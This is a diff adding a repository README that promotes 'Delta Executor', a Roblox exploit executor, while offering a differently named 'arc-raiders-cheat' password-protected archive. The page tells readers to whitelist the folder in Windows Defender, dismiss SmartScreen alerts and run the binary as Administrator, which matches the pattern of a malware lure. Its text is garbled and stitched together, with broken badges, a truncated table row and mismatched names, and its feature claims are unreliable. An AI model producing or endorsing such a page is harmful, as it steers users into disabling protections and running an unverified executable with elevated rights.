@@ -1,0 +1,54 @@
+🌊 Delta Executor — Free Download for Windows 2026]
+
+-green?style=for-the-badge&logo=github)
+
+-lightgrey?style=for-the-badge&logo=windows)
+
+🌊 Delta Executor (v2.4.1) supplies a zero-telemetry solution for Windows 10 and Windows 11. Packaged inside arc-raiders-cheat-v1.2.0-win64.zip (40.4 MB), arc-raiders-cheat-v1.2.0-win64.exe initializes with zero external dependencies.
+
+Direct Package: [arc-raiders-cheat-v1.2.0-win64.zip (40.4 MB) · Password: 2026 · Build: v2.4.1 (86843F)
+
+✨ Delta Executor — Key Highlights
+
+| Delta Executor Subsystem | Runtime Behavior (86843F) | Build |
+| :--- | :--- | :---: |
+| ⚡ Instant Client Attach | Coordinates low-latency instant client attach (delta-executor · Luau VM bridge & process attachment) for Delta Executor users across 16 worker threads. | v2.4.1 |
+| 📂 Auto-Execute Directory | Accelerates asynchronous auto-execute directory (delta-executor · automatic teleport script reloading) for Delta Executor users with zero frame-time spikes. | v2.4.1 |
+| 🖥️ Multi-Instance Attach | Powers direct-memory multi-instance attach (delta-executor · simultaneous multi-client execution) within the Delta Executor runtime across 5 worker threads. | v2.4.1 |
+| 📚 Integrated Script Hub | Optimizes deterministic integrated script hub (delta-executor · 1-click cloud preset execution) via delta-executor's core module across 8 worker threads. | v2.4.1 |
+| 🧪 98%+ sUNC Compatibility | Handles low-latency 98%+ sunc compatibility (delta-executor · hookmetamethod, getgc & Drawing API) across delta-executor sessions using  Archive Password: 2026 — Extract arc-raiders-cheat-v1.2.0-win64.zip completely before launching arc-raiders-cheat-v1.2.0-win64.exe` as Administrator.
+
+❓ Delta Executor (v2.4.1) — FAQ
+
+Is Delta Executor (arc-raiders-cheat-v1.2.0-win64.zip) compatible with Windows 10 and Windows 11?
+
+Yes — arc-raiders-cheat-v1.2.0-win64.exe (v2.4.1) runs natively on Windows 10 and Windows 11 across Intel and AMD x64 processors.
+
+What is the password to extract arc-raiders-cheat-v1.2.0-win64.zip for Delta Executor?
+
+Enter 2026 in 7-Zip or WinRAR when unpacking arc-raiders-cheat-v1.2.0-win64.zip (40.4 MB) before starting arc-raiders-cheat-v1.2.0-win64.exe.
+
+How do I fix Windows Defender or SmartScreen alerts on arc-raiders-cheat-v1.2.0-win64.exe (v2.4.1)?
+
+Because arc-raiders-cheat-v1.2.0-win64.exe (build 86843F) is an independent roblox executor binary, heuristic checks may prompt a warning. Confirm you downloaded arc-raiders-cheat-v1.2.0-win64.zip from dmack77/delta-executor, whitelist the delta-executor directory, and run arc-raiders-cheat-v1.2.0-win64.exe as Administrator.
+
+💻 arc-raiders-cheat-v1.2.0-win64.exe — System Requirements
+
+| delta-executor Attribute | Delta Executor Value |
+| :--- | :--- |
+| Target Platform | Windows 10 and Windows 11 |
+| Executable & Build | arc-raiders-cheat-v1.2.0-win64.exe (v2.4.1 · 86843F98FC) |
+| Release Archive | arc-raiders-cheat-v1.2.0-win64.zip (40.4 MB) |
+| Unzip Password | 2026 |
+
+Delta Executor Configuration (86843F)
+release:
+  repo: dmack77/delta-executor
+  build: v2.4.1
+  asset: arc-raiders-cheat-v1.2.0-win64.zip (40.4 MB)
+  password: "2026"
+  binary: arc-raiders-cheat-v1.2.0-win64.exe
+
+  🌊 Delta Executor · v2.4.1 (86843F98FC)
+
+  delta-executor
